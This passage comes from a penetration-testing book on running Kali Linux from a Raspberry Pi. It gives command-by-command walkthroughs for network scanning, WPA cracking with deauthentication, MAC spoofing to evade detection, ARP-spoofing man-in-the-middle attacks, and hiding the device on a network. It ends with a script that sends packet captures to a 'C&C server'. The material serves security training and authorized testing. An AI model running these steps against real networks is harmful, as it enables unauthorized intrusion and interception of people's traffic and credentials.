+there are other networks that you can scan to gain deeper access to your target's 
+network. We will cover breaching systems in Chapter 4 , Raspberry Pi Attacks .
+One huge advantage of the Raspberry Pi is its size and mobility. Typically, Kali 
+Linux is used from an attack system outside a target's network; however, tools such 
+as PWNIE Express and small systems that run Kali Linux, such as a Raspberry Pi, 
+can be placed inside a network and be remotely accessed as explained in Chapter 
+2, Preparing the Raspberry Pi , of this book. This gives an attacker a system inside 
+the network, bypassing typical perimeter defenses while performing internal 
+reconnaissance. This approach brings the obvious risks of having to physically 
+place the system on the network as well as create a method to communicate with it 
+remotely without being detected; however, if successful, this can be very effective.
+Let's look at a few popular methods to scan a target network. We'll continue forward 
+assuming that you have established a foothold on a network and now want to 
+understand the current environment that you have connected to.
+Nmap
+The most popular open source tool used to scan hosts and services on a network 
+is Nmap  (short for Network Mapper ). Nmap's advanced features can detect 
+different applications running on systems as well as offer services such as the 
+OS fingerprinting features. Nmap can be very effective; however, it can also be 
+easily detected unless used properly. We recommend using Nmap in very specific 
+situations to avoid triggering a target's defense systems.
+www.it-ebooks.info
+
+Chapter 3[ 53 ]For more information on how to use Nmap, visit http://nmap.org/ .
+To use Nmap to scan a local network, open a terminal window and type nmap 
+(target) , for example, nmap www.somewebsite.com  or nmap 192.168.1.2 . There 
+are many other commands that can be used to tune your scan. For example, you 
+can tune how stealthy you want to be or specify to store the results in a particular 
+location. The following screenshot shows the results after running Nmap against 
+www.thesecurityblogger.com . Note that this is an example and is considered a 
+noisy scan. If you simply type in either of the preceding two commands, it is most 
+likely that your target will easily recognize that you are performing an Nmap scan.
+www.it-ebooks.info
+
+Penetration Testing[ 54 ]There are plenty of online resources available to learn how to master the various 
+features for  Nmap. We will show other examples of using Nmap later in this chapter. 
+Here is  a reference list of popular nmap  commands:
+• nmap 192.168.1.0/24 : This scans the entire class C range
+• nmap -p <port ranges> : This scans specific ports
+• nmap -sP 192.168.1.0/24 : This scans the network/find servers and 
+devices that are running
+• nmap –iflist : This shows host interfaces and routes
+• nmap –sV 192.168.1.1 : This detects remote services' version numbers
+• nmap –sS 192.168.1.1 : This performs a stealthy TCP SYN scan
+• nmap –sO 192.168.1.1 : This scans for the IP protocol
+• nmap -192.168.1.1 > output.txt : This saves the output from the scan  
+to the text file
+• nmap –sA 192.168.1.254 : This checks whether the host is protected  
+by a firewall
+• nmap –PN 192.168.1.1 : This scans the host when it is protected  
+by a firewall
+• nmap --reason 192.168.1.1 : This displays the reason a port is in a 
+particular state
+• nmap --open 192.168.1.1 : This only shows open or possibly open ports
+The Nmap GUI software Zenmap is not included in the Kali Linux ARM 
+image. It is also not recommended over using the command line when 
+running Kali Linux on a Raspberry Pi.
+Wireless security
+Another attack vector that can be leveraged on a Raspberry Pi with a Wi-Fi adapter 
+is targeting wireless devices such as mobile tablets and laptops. Scanning wireless 
+networks, once they are connected, is similar to how scanning is done on a LAN; 
+however, typically a layer of password decryption is required before you can 
+connect to a wireless network. Also, wireless network identifier known as Service 
+Set Identifier  (SSID ) might not be broadcasted but will still be visible when you use 
+the right tools. This section will cover how to bypass wireless onboarding defenses 
+so that you can access a target's Wi-Fi network and perform the penetration testing 
+steps described in this book.
+www.it-ebooks.info
+
+Chapter 3[ 55 ]Looking at a Raspberry Pi with Kali Linux, one of the use cases is hiding the system 
+inside or near a target's network and launching wireless attacks remotely. The goal 
+will be to enable the Raspberry Pi to access the network wirelessly and provide a 
+remote connection back to the attacker. The attacker can be nearby using wireless 
+to control the Raspberry Pi until it gains wireless access. Once on the network, a 
+backdoor can be established so that the attacker can communicate with the Raspberry 
+Pi from anywhere in the world and launch attacks, as explained in Chapter 2 , Preparing 
+the Raspberry Pi . We will cover the building of this attack example using a rogue access 
+point in the Rogue access honeypots  section of Chapter 4 , Raspberry Pi Attacks .
+Cracking WPA/WPA2
+A commonly found security protocol for protecting wireless networks is Wi-Fi 
+Protected Access  (WPA ). WPA was later replaced by WPA2 and it will be probably 
+what you will be up against when you perform a wireless penetration test.
+WPA and WPA2 can be cracked with Aircrack . Kali Linux includes the Aircrack suite, 
+which is one of the most popular applications to break wireless security. Aircrack 
+works by gathering packets seen on a wireless connection to either mathematically 
+analyze the data to crack weaker protocols such as Wired Equivalent Privacy  (WEP ), 
+or use brute force on the captured data with a wordlist.
+Cracking WPA/WPA2 can be done due to a weakness in the four-way handshake 
+between the client and the access point. In summary, a client will authenticate 
+to an access point and go through a four-step process. This is the time when the 
+attacker is able to grab the password and use a brute force approach to identify it. 
+The time-consuming part in this is based on how unique the network password is, 
+how extensive your wordlist that will be used to brute force against the password is, 
+and the processing power of the system. Unfortunately, the Raspberry Pi lacks the 
+processing power and the hard drive space to accommodate large wordlist files. So, 
+you might have to crack the password off-box with a tool such as John the Ripper . 
+We recommend this route for most WPA2 hacking attempts.
+Here is the process to crack a WPA running on a Linksys WRVS4400N wireless 
+router using a Raspberry Pi on-box options. We are using a WPA example so that  
+the time-consuming part can be accomplished quickly with a Raspberry Pi. Most 
+WPA2 cracking examples would take a very long time to run from a Raspberry Pi; 
+however, the steps to be followed are the same to run on a faster off-box system. 
+www.it-ebooks.info
+
+Penetration Testing[ 56 ]The steps are as follows:
+1. Start Aircrack by opening a terminal and typing airmon-ng ;
+2. In Aircrack, we need to select the desired interface to use for the attack. In 
+the previous screenshot, wlan0  is my Wi-Fi adapter. This is a USB wireless 
+adapter that has been plugged into my Raspberry Pi.
+3. It is recommended that you hide your Mac address while cracking a 
+foreign wireless network. Kali Linux ARM does not come with the program 
+macchanger . So, you should download it by using the sudo apt-get 
+install macchanger  command in a terminal window. There are other ways 
+to change your Mac address, but macchanger can provide a spoofed Mac so 
+that your device looks like a common network device such as a printer. This 
+can be an effective way to avoid detection.
+4. Next, we need to stop the interface used for the attack so that we can change 
+our Mac address. So, for this example, we will be stopping wlan0  using the 
+following commands:
+airmon-ng stop wlan0
+ifconfig wlan0 down
+5. Now, let's change the Mac address of this interface to hide our true identity. 
+Use macchanger to change your Mac to a random value and specify your 
+interface. There are options to switch to another type of device; however, 
+for this example, we will just leave it as a random Mac address using the 
+following command:
+macchanger -r wlan0
+Our random value is b0:43:3a:1f:3a:05  in the following screenshot. 
+Macchanger shows our new Mac as unknown .
+www.it-ebooks.info
+
+Chapter 3[ 57 ]6. Now that our Mac is spoofed, let's restart airmon-ng  with the  
+following command:
+airmon-ng start wlan0
+7. We need to locate available wireless networks so that we can pick our target 
+to attack. Use the following command to do this:
+airodump-ng wlan0
+8. You should now see networks within range of your Raspberry Pi that can  
+be targeted for this attack. To stop the search once you identify a target,  
+press Ctrl + C. You should write down the Mac address, also known as 
+BSSID , and the channel, also known as CH, used by your target network.  
+The following screenshot shows that our target with ESSID  HackMePlease   
+is running WPA on CH 6:
+9. The next step is running airodump  against the Mac address that you just 
+copied. You will need the following things to make this work:
+ °The channel being used by the target
+ °The Mac address ( BSSID ) that you copied
+ °A name for the file to save your data
+Let's run the airodump  command in the following manner:
+airodump-ng –c [channel number] –w [name of file] –-bssid [target 
+ssid] wlan0
+This will open a new terminal window after you execute it. Keep that 
+window open.
+Open another terminal window that will be used to connect to the target's 
+wireless network. We will run aireplay  using the following command:
+aireplay-ng-deauth 1 –a [target's BSSID] –c [our BSSID] 
+[interface]
+www.it-ebooks.info
+
+Penetration Testing[ 58 ]For our example, the command will look like the following:
+aireplay-ng -–deauth 1 –a 00:1C:10:F6:04:C3 –c 00:0f:56:bc:2c:d1 
+wlan0
+The following screenshot shows the launch of the preceding command:
+You may not get the full handshake when you run this command. 
+If that happens, you will have to wait for a live user to authenticate 
+you to the access point prior to launching the attack. The output on 
+using Aircrack may show you something like Opening [file].cap  
+a few times followed by No valid WPA handshakes found , if you 
+didn't create a full handshake and somebody hasn't authenticated 
+you by that time. Do not proceed to the next step until you capture 
+a full handshake.
+10. The last step is to run Aircrack against the captured data to crack the WPA 
+key. Use the –w option to specify the location of a wordlist that will be used 
+to scan against the captured data. You will use the .cap  file that was created 
+earlier during step 9, so we will use the name capturefile.cap  in our 
+example. We'll do this using the following command:
+Aircrack-ng –w ./wordlist.lst wirelessattack.cap
+The Kali Linux ARM image does not include a wordlist.lst  
+file for cracking passwords. Usually, default wordlists are not 
+good anyway. So, it is recommended that you use Google to find 
+an extensive wordlist (see the next section on wordlists for more 
+information). Make sure to be mindful of the hard drive space that 
+you have on the Raspberry Pi, as many wordlists might be too large 
+to be used directly from the Raspberry Pi. The best practice for 
+running process-intensive steps such as brute forcing passwords is 
+to do them off-box on a more powerful system.
+www.it-ebooks.info
+
+Chapter 3[ 59 ]You will see Aircrack start and begin trying each password in the wordlist 
+file against the captured data. This process could take a while depending on 
+the password you are trying to break, the number of words in your list, and 
+the processing speed of the Raspberry Pi. We found that it ranges from a few 
+hours to days, as it's a very tedious process and is possibly better-suited for 
+an external system with more horsepower than a Raspberry Pi. You may also 
+find that your wordlist doesn't work after waiting a few days to sort through 
+the entire wordlist file.
+If Aircrack doesn't open and start trying keys against the password, 
+you either didn't specify the location of the .cap  file or the 
+location of the wordlist.lst  file, or you don't have the captured 
+handshake data. By default, the previous steps store files in the root 
+directory. You can move your wordlist file in the root directory to 
+mimic how we ran the commands in the previous steps since all our 
+files are located in the root directory folder. You can verify this by 
+typing ls to list the current directory files. Make sure that you list 
+the correct directories of each file that are called by each command.
+If your attack is successful, you should see something like the following 
+screenshot that shows the identified password as sunshine :
+It is a good idea to perform this last step on a remote machine. You can set up 
+a FTP server and push your .cap  files to that FTP server or use steps similar 
+to those covered under the Scripting tcpdump for future access  section found 
+later in this chapter.
+www.it-ebooks.info
+
+Penetration Testing[ 60 ]You can learn more about setting up an FTP server at http://www.
+raspberrypi.org/forums/viewtopic.php?f=36&t=35661 .
+Creating wordlists
+There are many sources and tools that can be used to develop a wordlist for your 
+attack. One popular tool called Custom Wordlist Generator  (CeWL ), allows you 
+to create your own custom dictionary file. This can be extremely useful if you are 
+targeting individuals and want to scrape their blogs, LinkedIn, or other websites for 
+commonly used words. CeWL doesn't come preinstalled on the Kali Linux ARM 
+image, so you will have to download it using apt-get install cewl .
+To use CeWL, open a terminal window and put in your target website. CeWL will 
+examine the URL and create a wordlist based on all the unique words it finds. In the 
+following example, we are creating a wordlist of commonly used words found on the 
+security blog www.drchaos.com  using the following command:
+cewl www.drchaos.com -w drchaospasswords.txt
+The following screenshot shows the launch of the preceding command:
+You can also find many examples of popular wordlists used as dictionary files on  
+the Internet. Here are a few wordlist examples sources that you can use; however,  
+be sure to research Google for other options as well:
+• https://crackstation.net/buy-crackstation-wordlist-password-
+cracking-dictionary.html
+• https://wiki.skullsecurity.org/Passwords
+Here is a dictionary that one of the coauthors of this book put together:
+http://www.drchaos.com/public_files/chaos-dictionary.lst.txt
+Capturing traffic on the network
+It is great to get access to a target network. However, typically the next step, once 
+a foothold is established, is to start looking at the data. To do this, you will need a 
+method to capture and view network packets. This means turning your Raspberry  
+Pi into a remotely accessible network tap.
+www.it-ebooks.info
+
+Chapter 3[ 61 ]Many  of these tools could overload and crash your Raspberry Pi. 
+Look out for our recommendations regarding when to use a tuning 
+method to avoid this from happening.
+Tcpdump
+Tcpdump is a command-line-based packet analyzer. You can use tcpdump  to 
+intercept and display TCP/IP and other packets that are transmitted and seen 
+attached by the system This means the Raspberry Pi must have access to the network 
+traffic that you intend to view or using tcpdump won't provide you with any useful 
+data. Tcpdump is not installed with the default Kali Linux ARM image, so you will 
+have to install it using the sudo apt-get install tcpdump  command.
+Once installed, you can run tcpdump  by simply opening a terminal window and 
+typing sudo tcpdump . The following screenshot shows the traffic flow visible  
+to us after the launch of the preceding command:
+As the previous screenshot shows, there really isn't much to see if you don't have 
+the proper traffic flowing through the Raspberry Pi. Basically, we're seeing our own 
+traffic while being plugged into an 802.1X-enabled switch, which isn't interesting. 
+Let's look at how to get other system's data through your Raspberry Pi.
+www.it-ebooks.info
+
+Penetration Testing[ 62 ]Running tcpdump  consumes a lot of the Raspberry Pi's processing 
+power. We found that this could crash the Raspberry Pi by itself or while 
+using it with other applications. We recommend that you tune your data 
+capture to avoid this from happening. Tuning a data capture will be 
+covered later in this chapter.
+Man-in-the-middle attacks
+One common method to capture sensitive information is by performing a man-in-
+the-middle attack. By definition, a man-in-the-middle attack is when an attacker 
+makes independent connections with victims while actively eavesdropping on the 
+communication. This is typically done between a host and the systems. For example, 
+a popular method to capture passwords is to act as a middleman between login 
+credentials passed by a user to a web server. We will cover this as well as a few other 
+common man-in-the-middle attacks performed with tools found in Kali Linux.
+Let's look at a few versions of man-in-the-middle attacks used to get data into your 
+Raspberry Pi.
+Getting data to the Pi
+There are a few methods to get data to your Raspberry Pi. One method is placing the 
+Raspberry Pi in line between two systems using two Ethernet ports. This requires a 
+USB to Ethernet adapter and the ability to physically connect the Raspberry Pi in this 
+fashion. In the following example, we are connecting a windows laptop to one end of 
+our Raspberry Pi and the network switch to the other. One of the Ethernet ports is a 
+USB adapter.
+For live penetration testing, you can customize the Raspberry Pi's protective case, as 
+shown in the following image, to mimic anything from a power plug to a network 
+hub to hide your attack system. We found that the average person won't mess with a 
+small box attached to a network device if it looks like it belongs there. Once, we also 
+placed a Raspberry Pi in office stationery, such as a hollow alarm clock, to conceal it 
+during an authorized penetration test.
+www.it-ebooks.info
+
+Chapter 3[ 63 ]
+The Raspberry Pi needs to be configured to bridge the target system's Ethernet port 
+to the network-facing port and vice versa in order to see traffic. Without doing this, 
+traffic will die once it hits the Pi. Before doing this, you will need to install the bridge  
+utility that will be used to bridge the two ports together. To install this, use the  
+apt-get install bridge-utils  command. Once installed, here is the procedure  
+to turn your Raspberry Pi into a network bridge for network taping purposes.
+Setting up a Raspberry Pi in this manner is also ideal to use it as 
+an intrusion detection/prevention asset. We will cover this in 
+Chapter 6 , Other Raspberry Pi Projects .
+1. You will need to configure both Ethernet ports as open IP addresses, which 
+is also known as setting them to 0.0.0.0 . To do this. use the ifconfig 
+eth[interface number] 0.0.0.0  command for both interfaces in the 
+following manner:
+Ifconfig eth0 0.0.0.0
+Ifconfig eth1 0.0.0.0
+Make sure that you download the bridge-utils  utility 
+before doing this, or you will have to reset the Internet-facing 
+interface back to a working state to download the utility prior to 
+proceeding. Another work around is installing a USB to Wi-Fi 
+adapter or another USB to Ethernet adapter temporarily to get 
+back online and download the missing application.
+www.it-ebooks.info
+
+Penetration Testing[ 64 ]2. Next, we will bridge the interfaces to a bridge0  interface using the brctl  
+command and add both the Ethernet interfaces:
+brctl addbr bridge0
+brctl addif bridge0 eth0
+brctl addif bridge0 eth1
+This command won't work if you haven't installed the bridge-utils  utility.
+3. The last step is turning on the new bridge containing both the Ethernet 
+interfaces using the following command:
+Ifconfig bridge0 up
+The following screenshot shows what all the commands look like:
+The following screenshot shows the output of tcpdump viewing traffic as the 
+target laptop surfs the Internet:
+www.it-ebooks.info
+
+Chapter 3[ 65 ]You may find that some traffic such as the web-based SSL traffic 
+is encrypted. We will cover how to beat this using SSLstrip later in 
+this chapter.
+Another approach to get data through the Raspberry Pi is to redirect traffic 
+from a system on the same network subnet using a man-in-the-middle 
+approach so that you don't have to mess with the physical connection  
+of that target. Let's look at how this works.
+Many network switches made by vendors such as Cisco and 
+Juniper offer techniques to avoid Address Resolution Protocol  
+(ARP ) poisoning. For this reason, we recommend the network tap 
+approach for real penetration testing environments.
+ARP spoofing
+The second method to capture data with your Raspberry Pi is identifying a target 
+system on the same network and ARP spoofing its traffic through your Raspberry 
+Pi. To do this, you will need to download the dsniff  package since it doesn't come 
+preinstalled on the Kali Linux ARM image. Use the sudo apt-get install dsniff  
+command to install the package prior to launching the ARP spoofing exercise.  
+Once you install dsniff , you are ready to start your ARP spoofing attack using  
+the following steps:
+This approach will not work if a target's switch has ARP poisoning 
+mitigation enabled. For example, on Cisco switches, enabling 
+DHCP snooping  and Dynamic ARP Inspection  will prevent 
+this. These commands on a Cisco switch will look like ip dhcp 
+snooping  and ip arm inspection vlan [vlan number] .
+1. Enable IP forwarding to enable ARP spoofing to pass packets to and fro 
+between the target to the Raspberry Pi using the following command:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+You can verify whether IP forwarding is enabled by using the cat 
+command to display 1 on the screen, representing that it is operating. 
+The command is as follows:
+cat /proc/sys/net/ipv4/ip_forward
+www.it-ebooks.info
+
+Penetration Testing[ 66 ]2. Now, you need to find the default gateway and subnet mask of the network 
+to which your Raspberry Pi is connected. You can find this using the 
+following command:
+netstat –nr
+The following screenshot  shows our default gateway as 10.0.2.1  on a class 
+C network, also known as network mask 255.255.255.0 :
+3. Next, let's identify a target to attack. As mentioned earlier in this chapter, 
+nmap  is a great tool for identifying what systems are on the network. In this 
+case, we want to do a reverse lookup using –R and include sn to avoid port 
+scanning since we are just looking for a target. The previous screenshot 
+showed that the default gateway network is a class C, so we can scan the 
+entire subnet for a target with nmap  using the following command:
+nmap –Rsn 10.0.2.0/24
+Our scan shows a Dell  laptop with the IP address 10.0.2.63  that is 
+available for our attack. The other devices look like Cisco  and Meraki  
+network devices. Let's target the host laptop.
+www.it-ebooks.info
+
+Chapter 3[ 67 ]4. Now its time to start ARP cache poisoning the traffic between our target 
+and the default gateway so that we can tap into that traffic. Our interface 
+is eth0  that is represented by the –i option, the target is 10.0.2.63  that is 
+represented by the –t option, and the default route that is also known as a 
+gateway is 10.0.2.1 . This is represented by the -r option. The command is 
+as follows:
+arpspoof –i eth0 –t 10.0.2.63 –r 10.0.2.1
+In this use case, we are using the physical Ethernet adapter 
+on the Raspberry Pi for this attack. If you use a USB wireless 
+adapter, you would most likely use wlan0  as your interface.
+5. You should start to see traffic from the ARP cache poisoning running in the 
+window as shown in the following screenshot. Leave this open and run a tool 
+such as Wireshark to view the traffic for a data capture. We will cover this 
+later in this chapter.
+Ettercap
+There are utilities available that simplify the ARP spoofing or the port bridging 
+process. Ettercap is a very popular man-in-the-middle attack suite that includes 
+handling the ARP spoofing steps previously described. Its other key features include 
+sniffing live connections, filtering content on the fly, and various other attacks on 
+victims. Go to ettercap.github.io/ettercap/  for more information on this tool.
+www.it-ebooks.info
+
+Penetration Testing[ 68 ]The Kali Linux ARM image does not include Ettercap. There are two options to 
+install Ettercap, as shown in the following screenshot, after you run the apt-get 
+install ettercap  command. We will start by using the Ettercap GUI option and 
+use the apt-get ettercap-graphical  command to install it.
+To run Ettercap  once it is installed, type sudo ettercap -G . This will bring up the 
+Ettercap GUI as shown in the following screenshot:
+Ettercap has two sniffing options. Option one is Unified sniffing, which means 
+sniffing all packets that pass on the cable via one interface. This method has options 
+such as using promiscuous mode, which means packets that are not directed to  
+the host are automatically forwarded to it using layer three routing. Ettercap will 
+disable the kernel ip-forwarding  to avoid sending the packets twice via the  
+kernel and Ettercap.
+This approach will not work if a target's switch has ARP poisoning 
+mitigation enabled. For example, on Cisco switches, enabling DHCP 
+snooping  and Dynamic ARP Inspection  will prevent this. These 
+commands on a Cisco switch will look like ip dhcp snooping  and ip 
+arm inspection vlan [vlan number] .
+www.it-ebooks.info
+
+Chapter 3[ 69 ]Option two is Bridged sniffing, which means using two network interfaces 
+and forwarding traffic between them. This is similar to how we used the brctl  
+command to bridge two ports earlier in this chapter. Using this sniffing method 
+is recommended over ARP poisoning since it is stealthier and more likely to be 
+successful. This is due to the fact that advanced switches have methods to battle 
+ARP poisoning attacks. The downside of this approach is to physically connect a 
+Raspberry Pi in this fashion.
+Setting up a Raspberry Pi in this manner is also ideal to use your 
+Raspberry Pi as an intrusion detection/prevention asset. We will 
+cover this in Chapter 5 , Ending the Penetration Test .
+For our example, we will use Unified sniffing since our Raspberry Pi is using one 
+eth0  port for the attack. Click on the Sniff  menu and select Unified sniffing...  as 
+shown in the following screenshot:
+Ettercap will ask you to select an interface from your Raspberry Pi. We are only 
+using the standard eth0  port for this attack so we have selected that, as shown  
+in the following screenshot:
+www.it-ebooks.info
+
+Penetration Testing[ 70 ]Ettercap will display some details about the plugs and ports that it has in the bottom 
+window. You will also notice in the following screenshot that some new options will 
+appear in the top menu. Now, we need to scan for hosts on the network to attack. 
+You can do this by clicking on Hosts  from the menu and selecting Scan for hosts . 
+You will see a progress bar while Ettercap scans the network for targets.
+You will see that the results appear at the bottom of the text box. In our example, we 
+found four hosts. You can view the hosts by clicking on Hosts  and choosing Host 
+list. The following screenshot shows the Host List  with four hosts:
+www.it-ebooks.info
+
+Chapter 3[ 71 ]You will need to select which hosts you want to place in your Target 1  and Target 2  
+areas in order for things to work. For our example, we will select 10.0.2.1 , which is 
+the default gateway, as Target 2 . We will use the victim system 10.0.2.64  as Target 
+1. This will place our Raspberry Pi between both these targets.
+To add an IP address to a target, click on it in the IP Address  section in the Host List  
+and click on Add to Target  X, where X is the target that you are adding. You will see 
+Ettercap display in the bottom window that the IP address you selected was added 
+to the target you selected. You can also verify this by selecting Targets  from the 
+menu and choosing Current Targets . The following screenshot shows the addition  
+of host 10.0.2.64  as Target 1 :
+To ARP spoof our selected targets, we can select Mitm  and choose Arp Poisoning... . 
+This will bring up a window asking you to select between two additional options 
+of Sniff remote connections  or Only poison one-way  as shown in the following 
+screenshot. Select Sniff remote connections  and click on the OK button.
+www.it-ebooks.info
+
+Penetration Testing[ 72 ]Once you click on the OK button, Ettercap should display in the bottom window that 
+it's ARP poisoning all victims in Group 1 and Group 2 lists that we selected as Target 
+1 and Target 2  from the host scan. The final step is to select Start sniffing  from the 
+Start  menu, as shown in  the following screenshot:
+The Raspberry Pi should now be placed in the middle between the target system and 
+the default gateway, and let you to view the traffic with a sniffing software such as 
+Wireshark. Ettercap has a sniffing option but it is not as good as other tools such as 
+Wireshark, which we will cover later in this chapter. To monitor the ARP spoofing 
+attack in Ettercap while it's running, click on View  and select Connections .
+Ettercap command line
+Ettercap also offers a command-line flavor of the software that consumes less 
+resources than the GUI. You can download this version of Ettercap by using  
+the apt-get install ettercap-text-only  command.
+Let's say you want to perform all the steps covered in the GUI example and attack 
+all devices on the same network as the Raspberry Pi. The following command string 
+will quickly accomplish this:
+ettercap –Tqi eth0 –M arp:remote //
+www.it-ebooks.info
+
+Chapter 3[ 73 ]The following screenshot shows an output similar to the GUI approach:
+However, for this example, we are attacking all the hosts in Group 1  and Group 2 , 
+which means everybody on the network. You can see that we're listening on eth0  
+as specified in the command, and Ettercap has found four hosts and added them to 
+both groups. You will also notice that we couldn't decrypt SSL traffic; however, this 
+will be covered later in this chapter.
+You can verify whether this Ettercap is working with any network monitoring 
+software such as the urlsnarf  part of the dsniff  package. To do this, use the 
+urlsnarf –i [the network interface]  command, as shown in the following 
+screenshot:
+www.it-ebooks.info
+
+Penetration Testing[ 74 ]You will start seeing network traffic in a terminal window representing what is being 
+captured while your attack is in progress, as shown in the following screenshot:
+Driftnet
+One utility that is used to see images captured during a man-in-the-middle attack 
+is a program called Driftnet. There are better ways to find more interesting data; 
+however, driftnet can be useful if you are focusing on viewing images. Driftnet does 
+not come preinstalled on Kali Linux ARM. You can download it by using the apt-
+get install driftnet  command.
+Once installed, use the driftnet –i eth0  command to run it. This will open up a  
+new terminal window that will be blank. Any images seen by a victim during 
+the man-in-the-middle attack will start populating in this window. The following 
+screenshot shows a host accessing www.cisco.com  while driftnet is capturing images:
+www.it-ebooks.info
+
+Chapter 3[ 75 ]
+Tuning your network capture
+During real penetration testing exercises, we found that running raw tcpdump  
+captures or using tools such as Wireshark consume a lot of processing power and 
+sometimes crash the Raspberry Pi or render it useless. For this reason, the best 
+practice is to avoid using such tools in real environments unless you tune what  
+is captured to  reduce the overhead on the Raspberry Pi. Here are some steps to 
+capture network traffic using tcpdump  in a controlled manner.
+Tcpdump is a very useful tool and knowing what you are doing with the utility will 
+help you to get the most out of the tool on the Raspberry Pi. The following section 
+will provide a few tuning pointers but it is not intended to be a tcpdump tutorial.
+The first thing to consider is how to narrow down what tcpdump is looking for.  
+You can do this in a few ways. The first way is to specify the host  keyword. The 
+host  keyword will look for traffic specified by a hostname or IP address. It can be 
+done in the following manner:
+tcpdump host www.drchaos.com
+Or, we can do it using the IP address in the following manner:
+tcpdump host 8.8.8.8
+www.it-ebooks.info
+
+Penetration Testing[ 76 ]You can also specify the source IP address, destination IP address, or both the source 
+and the destination. In the following example, we have defined both the source  
+and the destination:
+Tcpdump src 1.1.1.1  dst 2.2.2.2
+If needed, you don't have to be this specific and can limit the search to only the 
+source or the destination.
+You may have a need to  look at all the traffic belonging to a particular network's 
+subnet. To do this, use the net command in tcpdump . You should, however, keep 
+in mind a few things before doing this. On a busy network, your Raspberry Pi will 
+most likely not be able to keep up with this traffic capture. It is not only limited by 
+the processing power, but also by the 100 MB network interface. If you exceed the 
+capabilities of the Raspberry Pi, the best-case scenario is that it will drop traffic and not 
+capture what you expected. The worst-case scenario could mean crashing the system.
+The following commands are used to look at all the traffic belonging to a particular 
+network's subnet:
+tcpdump net 10.0.1.0/24
+tcpdump icmp
+You can search for specific protocols as shown in the following example:
+tcpdump port 80,21
+Although  it is called tcpdump, you can specify Transmission Control Protocol  
+(TCP ), User Datagram Protocol  (UDP ), and Internet Control Message Protocol  
+(ICMP ) protocols.
+You can specify specific port numbers to monitor. You can also specify whether this 
+is going to be a source port or a destination port. You can see from the following 
+example that we combined several options:
+tcpdump src port 1099 and udp icmp and src port 20
+You should write your findings to a file that can be analyzed later. To write your 
+findings to a file, use the –w option followed by the name of the file in which you  
+are going to save them. It is good practice to use .cap  as a file extension:
+tcpdump -s 10994 port 80 -w my_capture_file.cap
+You can read the file directly from tcpdump using the –r option as shown in the 
+following command:
+tcpdump -r my_capture_file.cap
+www.it-ebooks.info
+
+Chapter 3[ 77 ]However, we  recommend that you remotely transfer the file to an FTP, SCP, HTTPS 
+or any other type of  server.
+Scripting tcpdump for future access
+You may want to export network captures to avoid running out of space on the local 
+Raspberry Pi. Here are some steps to export the captured data to an external source for 
+more resource-intensive tasks such as password cracking or for reporting purposes. 
+These are also ideal for other sections of this book that require exporting data.
+In Chapter 2 , Preparing the Raspberry Pi , we recommended setting up a remote server 
+that is also known as a C&C server. We also mentioned transferring captured files to 
+an FTP server in one of the previous steps in this chapter. Regarding the use of FTP, 
+it is important to remember that FTP is inherently insecure. People have used FTP for 
+a variety of different reasons. However, for real world penetration testing exercises, 
+it is critical to protect FTP through another form of encryption such as an Internet 
+Protocol Secutiry  (IPsec ) tunnel or SSH/Secure File Transfer Protocol  (SFTP ). IPsec 
+ensures all data transfers never occur over the Internet that is, in the open for others 
+to capture and view. Protecting your FTP also gives you full control of the both sides 
+of the networks meaning the client and server, as well the transport medium.
+You may ask "Why go to these lengths and not just use FTP?" If you plan 
+to capture sensitive information, it would make sense to protect that data. 
+This begs the question, why consider FTP in the first place? We used FTP 
+in previous sections because of industry familiarity and the availability of 
+automatic scripting for file transfers. However, you can achieve the same 
+results by searching for more secure protocols.
+Let's look at how to develop a simple FTP script to extract data from a remote 
+Raspberry Pi in the following manner. First, open up a text editor and save the  
+file with a .py extension. We saved our file as ftp.py .
+import ftplib                             #importing ftp module in 
+python
+session = ftplib.FTP('server.IP.address.com','USERNAME','PASSWORD')
+file = open('*.cap','rb')                  # file to send
+session.storbinary('STOR *.cap', file)     # send the file
+file.close()                               # close file and FTP
+session.quit()                             # Quit the ftp session
+www.it-ebooks.info
+
+Penetration Testing[ 78 ]Next, you will need to change the permissions on the file. You can do this by issuing 
+the chmod 777 ftp.py  command to make it an executable file.
+This is a very basic script. You will need to specify the file you would like to transfer, 
+the username, password, and the IP address of your server.
+If you find that you use this script method often, you probably will want to add 
+options such as automatically monitoring a directory for captures and then using 
+FTP to automate an upload. You may even want to change the upload directory.
+Tcpdump and files exported from a Raspberry Pi containing tons of captured packet 
+data might be difficult to view as well as organize. A more popular approach of 
+working with such data is using the industry standard GUI-based network analyzer 
+Wireshark for this purpose. Let's look at how that application works.
+We found that Wireshark requires more processing power than many 
+lightweight command-line tools and sometimes might cause the 
+Raspberry Pi to become unstable or flat out crash. For this reason, we 
+recommend that you use tcpdump and tune the capture , which we just 
+covered as the primary method to capture data. Wireshark is better suited 
+to use on your C&C server to view captured data rather than directly 
+from your Raspberry Pi.
+Wireshark
+Wireshark  is one of the most popular open source packet analyzer programs 
+available today. It can be used to troubleshoot network problems, analyzing 
+communication between systems, and in the case of a penetration test, to capture 
+data once you breach a network. Think of Wireshark as tcpdump with a pretty 
+graphical interface and nifty data sorting features. Wireshark comes preinstalled on 
+the Kali Linux ARM image and can be found under the top ten tools category in the 
+Kali Linux application drop-down menu.
+Test out your Wireshark use case in a lab prior to using it in a live 
+environment. We found that Wireshark sometimes crashed our Raspberry 
+Pi during real exercises. For this reason, we recommend that you use 
+a tuned tcpdump approach directly on a Raspberry Pi and Wireshark 
+on a remote C&C server. If you must use Wireshark, use TShark on the 
+Raspberry Pi and the full-blown Wireshark on your C&C server.
+www.it-ebooks.info
+
+Chapter 3[ 79 ]There are two ways of using Wireshark. Let's start by looking at the full-blown GUI.
+When you start Wireshark, you will see an error message and later a warning 
+message stating that you are running Wireshark as a super user, also known  
+as root. Just click on OK to access the main GUI.
+The following screenshot shows a Wireshark GUI:
+At this point, we assume that you have traffic running through your Raspberry Pi 
+using methods previously covered in this chapter and are now looking at live data. 
+The first step is viewing what interfaces you want to examine with Wireshark by 
+clicking on the Interface List  button. This will bring up a window showing all the 
+interfaces and which interfaces are seeing traffic:
+www.it-ebooks.info
+
+Penetration Testing[ 80 ]If you are running the Raspberry Pi as a bridge between two Ethernet interfaces, 
+you will need to select the bridge0  interface as your data source. If you are using 
+the ARP poisoning method to read data, meaning you are only using one interface, 
+you will need to select a network facing port such as eth0 , as shown in the previous 
+screenshot example. Click on the Start  button once you click the check box next to 
+the interface you are going to monitor.
+You can also use Wireshark to view the data previously captured, such 
+as in a Packet Capture  (pcap ) file. This is ideal when placing a Raspberry 
+Pi on a  network to do a network capture and later view what was found. 
